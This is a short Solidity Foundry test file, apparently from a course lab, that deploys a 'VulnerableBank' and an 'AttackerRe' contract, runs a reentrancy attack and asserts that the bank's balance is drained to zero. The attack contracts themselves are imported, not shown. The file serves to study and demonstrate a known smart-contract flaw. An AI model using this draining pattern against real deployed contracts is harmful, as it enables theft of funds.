pragma solidity ^0.8.0;

import "../src/csc403-attacker.sol";
import "../src/csc403.sol";
import {Test, console} from "forge-std/Test.sol";

contract exploit is Test{


    VulnerableBank public bank;
    AttackerRe public attacker;

    function setUp() external{

        bank = new VulnerableBank();
        attacker = new AttackerRe(address(bank));
        vm.deal(address(bank), 5 ether);
        vm.deal(address(attacker), 1 ether);
    }

    function testExploitRe() external{

        vm.startPrank(address(attacker));
        attacker.attack{value: 1 ether}();
        assert(address(bank).balance == 0);
        console.log(address(attacker).balance);
        vm.stopPrank();


    }
}
